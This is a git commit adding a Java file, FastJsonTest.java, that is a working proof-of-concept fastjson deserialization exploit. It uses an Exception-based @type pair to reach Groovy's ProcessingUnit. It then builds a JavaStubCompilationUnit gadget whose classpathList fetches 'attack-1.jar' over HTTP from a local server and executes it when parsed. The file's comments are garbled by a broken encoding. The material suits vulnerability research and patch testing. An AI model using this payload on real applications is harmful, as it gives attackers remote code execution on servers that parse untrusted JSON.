1eca52c0239de6d01df2c67463ba73db890d844b
tulei <lei.tu@avatr.com>
2024-05-30 15:24:43 +0800

    add fastjson vuln

---
+++ src/main/java/com/example/demo/fastjson/FastJsonTest.java
@@ -0,0 +1,38 @@
+package com.example.demo.fastjson;
+
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.JSONObject;
+
+public class FastJsonTest {
+    public static void main(String[] args) {
+        String json ="{\n" +
+                "  \"@type\":\"java.lang.Exception\",\n" +
+                "  \"@type\":\"org.codehaus.groovy.control.CompilationFailedException\",\n" +
+                "  \"unit\":{\n" +
+                "  }\n" +
+                "}";
+
+        try {
+            // �����л���org.codehaus.groovy.control.ProcessingUnit ���������
+            JSON.parse(json);
+        } catch (Exception e) {
+            //e.printStackTrace();
+        }
+
+        json =
+                "{\n" +
+                        "  \"@type\":\"org.codehaus.groovy.control.ProcessingUnit\",\n" +
+                        "  \"@type\":\"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\",\n" +
+                        "  \"config\":{\n" +
+                        "    \"@type\": \"org.codehaus.groovy.control.CompilerConfiguration\",\n" +
+                        "    \"classpathList\":[\"http://127.0.0.1:8000/attack-1.jar\"]\n" +
+                        "  },\n" +
+                        "  \"gcl\":null,\n" +
+                        "  \"destDir\": \"/tmp\"\n" +
+                        "}";
+        // �����л���ִ��
+        JSON.parse(json);
+
+
+    }
+}
